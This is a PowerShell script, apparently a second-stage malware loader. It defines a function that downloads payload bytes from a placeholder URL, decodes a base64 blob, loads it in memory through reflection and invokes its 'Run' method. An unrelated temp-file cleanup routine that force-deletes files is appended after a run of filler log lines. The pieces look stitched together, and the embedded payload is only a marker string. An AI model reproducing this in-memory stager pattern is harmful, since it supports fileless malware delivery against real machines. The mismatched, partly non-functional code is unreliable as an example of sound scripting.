<#
.SYNOPSIS
    Managed assembly acquisition and reflection workflow.

.DESCRIPTION
    Downloads or decodes a managed payload stage, loads it into the
    current AppDomain, then looks for a conventional entry method
    and invokes it only when present.

.NOTES
    The loader expects a managed payload stage.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$RemoteUrl = "https://127.0.0.1/payload.bin",
    [string]$StageLog = "$env:TEMP\stage.log",
    [int]$TimeoutSec = 49
)
$ErrorActionPreference = "Stop"

# Acquisition
function Get-StageAssemblyBytes {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [int]$TimeoutSec = 49
    )

    Write-Verbose ("Downloading assembly bytes from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadData($SourceUrl)
}

# Reflection
function Invoke-AssemblyEntryPoint {
    param(
        [object]$LoadedAssembly = $null
    )

    if ($null -eq $LoadedAssembly) {
        throw "Loaded assembly is null"
    }
    $Types = $LoadedAssembly.GetTypes()
    if ($Types.Length -gt 0) {
        $EntryMethod = $Types[0].GetMethod("Run")
        if ($null -ne $EntryMethod) {
            Write-Verbose "Invoking entry method"
            return $EntryMethod.Invoke($null, @())
        }
    }
    Write-Verbose "No conventional entry method found"
    return $null
}

try {
    Write-Verbose "Starting managed loader"
    $StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpvZmw4eGd1ODZi")
    Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
    $TransferResult = [Reflection.Assembly]::Load($StageBytes)
    $EntryResult = Invoke-AssemblyEntryPoint -LoadedAssembly $TransferResult
    Write-Verbose ("Entry result: " + $EntryResult)
}
catch {
    Write-Warning "Managed loader failed: $($_.Exception.Message)"
}

$AssemblyReport = [ordered]@{
    Stage = "reflection"
    ByteCount = $StageBytes.Length
    Endpoint = $RemoteUrl
}
$AssemblyReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Inspecting process list"
Write-Verbose "Applying operation timeout"
Write-Verbose "Preparing working directory"
Write-Verbose "Starting workflow"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Checking local path"
Write-Verbose "Operation completed"
Write-Verbose "Collecting host metadata"
Write-Verbose "Stage handoff finished"
Write-Verbose "Exporting operation report"
Write-Verbose "Retry budget remaining"
Write-Verbose "Validating result"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
$TempRoot  = $env:TEMP
$AgeDays   = 3
$MinSizeMB = 5
$LogPath   = "C:\Logs\temp-cleanup-2025-07-03.log"
$DryRun    = $false


$cutoff = (Get-Date).AddDays(-$AgeDays)
$stale = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB) }
foreach ($file in $stale) {
    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
}
$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
Write-Host ("Removed {0} files, reclaimed {1} MB" -f @($stale).Count, $reclaimMB) -ForegroundColor Green
